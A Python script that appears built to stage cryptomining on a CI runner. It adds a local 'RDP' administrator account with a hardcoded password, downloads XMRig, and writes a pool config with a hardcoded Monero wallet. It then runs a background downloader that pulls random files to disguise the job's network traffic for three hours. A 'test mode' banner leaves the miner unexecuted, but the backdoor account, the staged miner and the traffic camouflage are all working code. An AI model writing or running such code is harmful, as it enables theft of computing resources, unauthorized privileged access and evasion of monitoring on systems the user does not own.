import os
import subprocess
import tempfile
import time
import random
import threading
import urllib.request
import zipfile
import json
import sys

# ==================== Configuration ====================
WALLET = "49UWTwnrxNXi8eMTCqdC5U3eiMHrPZkvvbsYN3WEde4o9RYebixumBCCy5oCdoSKkS2U6t9gXJFzJNkxXC7tJ1Uq4uky5BP"
POOL = "pool.hashvault.pro:443"
FINGERPRINT = "420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14"
CPU_HINT = 10
RUNTIME_MINUTES = 180

# ==================== Helper Functions ====================
def create_user():
    """Create a local user 'RDP' (as in your workflow)."""
    try:
        subprocess.run(
            ['net', 'user', 'RDP', 'Runner-12345', '/add'],
            check=True, capture_output=True
        )
        subprocess.run(['net', 'localgroup', 'Administrators', 'RDP', '/add'], check=True)
        print("[+] User 'RDP' created.")
    except subprocess.CalledProcessError as e:
        print(f"[!] User creation failed: {e.stderr.decode()}")

def download_xmrig():
    """Download and extract XMRig, return path to executable."""
    miner_url = "https://github.com/xmrig/xmrig/releases/download/v6.21.2/xmrig-6.21.2-msvc-win64.zip"
    zip_path = os.path.join(tempfile.gettempdir(), 'xmrig.zip')
    extract_dir = os.path.join(tempfile.gettempdir(), 'xmrig')
    print("[+] Downloading miner...")
    urllib.request.urlretrieve(miner_url, zip_path)
    with zipfile.ZipFile(zip_path, 'r') as z:
        z.extractall(extract_dir)
    exe_path = None
    for root, dirs, files in os.walk(extract_dir):
        if 'xmrig.exe' in files:
            exe_path = os.path.join(root, 'xmrig.exe')
            break
    if not exe_path:
        raise Exception("xmrig.exe not found")
    print(f"[+] Miner downloaded to {exe_path}")
    return exe_path

def create_config(exe_path):
    """Create config.json in the same folder as the miner."""
    config = {
        "autosave": True,
        "cpu": {"enabled": True, "max-threads-hint": CPU_HINT},
        "opencl": False,
        "cuda": False,
        "pools": [{
            "algo": "rx/0",
            "url": POOL,
            "user": WALLET,
            "pass": "x",
            "tls": True,
            "tls-fingerprint": FINGERPRINT
        }],
        "donate": {"level": 1}
    }
    config_path = os.path.join(os.path.dirname(exe_path), 'config.json')
    with open(config_path, 'w') as f:
        json.dump(config, f, indent=4)
    print(f"[+] Config created at {config_path}")

def random_downloader(stop_event):
    """Background thread that downloads random files while the miner would run."""
    base_url = "https://speedtest.tele2.net/"
    while not stop_event.is_set():
        size = random.randint(10, 100)
        url = f"{base_url}{size}MB.zip"
        temp_file = os.path.join(tempfile.gettempdir(), f"rand_{size}.zip")
        try:
            print(f"[Downloader] Downloading {size} MB from {url}")
            urllib.request.urlretrieve(url, temp_file)
            os.remove(temp_file)
            print(f"[Downloader] Done, removed.")
        except Exception as e:
            print(f"[Downloader] Error: {e}")
        sleep_time = random.randint(30, 90)
        for _ in range(sleep_time):
            if stop_event.is_set():
                break
            time.sleep(1)

def main():
    print("=== TEST MODE: Miner will NOT be started ===")
    create_user()
    exe_path = download_xmrig()
    create_config(exe_path)
    print("[+] Miner downloaded and configured, but will not be executed.")

    # Start random downloader to simulate network activity
    stop_event = threading.Event()
    download_thread = threading.Thread(target=random_downloader, args=(stop_event,), daemon=True)
    download_thread.start()
    print("[+] Started random downloader to mimic traffic.")

    # Monitor for 3 hours (just keep the job alive)
    start_time = time.time()
    end_time = start_time + RUNTIME_MINUTES * 60
    try:
        while time.time() < end_time:
            print(f"[Heartbeat] Test running, {int((end_time - time.time())/60)} minutes remaining.")
            time.sleep(60)
    except KeyboardInterrupt:
        print("[*] Interrupted by user.")
    finally:
        print("[*] Stopping downloader...")
        stop_event.set()
        download_thread.join(timeout=10)
        print("[+] Test completed.")

if __name__ == "__main__":
    main()
